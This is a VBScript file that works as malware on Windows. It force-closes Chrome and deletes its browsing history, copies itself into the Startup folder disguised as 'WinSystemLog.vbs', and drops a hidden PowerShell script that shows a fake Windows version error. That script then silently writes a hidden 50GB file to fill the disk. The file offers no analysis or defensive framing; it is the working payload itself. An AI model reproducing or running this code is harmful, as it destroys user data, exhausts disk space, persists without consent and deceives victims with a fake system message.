Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

WshShell.Run "powershell -WindowStyle Hidden -Command ""Stop-Process -Name chrome -Force -EA SilentlyContinue; Remove-Item '$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History' -Force -EA SilentlyContinue""", 0, False

CurrentDir = fso.GetParentFolderName(WScript.ScriptFullName)
psPath = CurrentDir & "\Safety_Test.ps1"

WshShell.Run "taskkill /F /IM powershell.exe /T", 0, True
On Error Resume Next
WshShell.Run "attrib -s -h -r " & Chr(34) & psPath & Chr(34), 0, True
fso.DeleteFile psPath, True
On Error GoTo 0

Set fso = CreateObject("Scripting.FileSystemObject")
strStartupFolder = CreateObject("WScript.Shell").SpecialFolders("Startup")
strDestination = strStartupFolder & "\WinSystemLog.vbs"

If Not fso.FileExists(strDestination) Then
    fso.CopyFile WScript.ScriptFullName, strDestination, True
End If

Set psFile = fso.CreateTextFile(psPath, True)
psFile.WriteLine "$TargetDir = '" & CurrentDir & "'"
psFile.WriteLine "$BigFile = Join-Path $TargetDir 'core_dump.txt'"
psFile.WriteLine "Add-Type -AssemblyName PresentationFramework"
psFile.WriteLine "[System.Windows.MessageBox]::Show('Windows Version Error: build 23H2 incompatible, Press OK to delete this script', 'System Error', 0, 16)"
psFile.WriteLine "$Stream = [System.IO.File]::OpenWrite($BigFile)"
psFile.WriteLine "$Buffer = New-Object Byte[] 1048576"
' 循环 51200 次 = 50GB
psFile.WriteLine "for($i=1; $i -le 51200; $i++) { $Stream.Write($Buffer, 0, $Buffer.Length); Start-Sleep -Milliseconds 1 }"
psFile.WriteLine "$Stream.Close()"
psFile.WriteLine "attrib +h +s +r $BigFile"
psFile.Close

fso.GetFile(psPath).Attributes = 2 + 4
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & psPath & Chr(34), 0, False






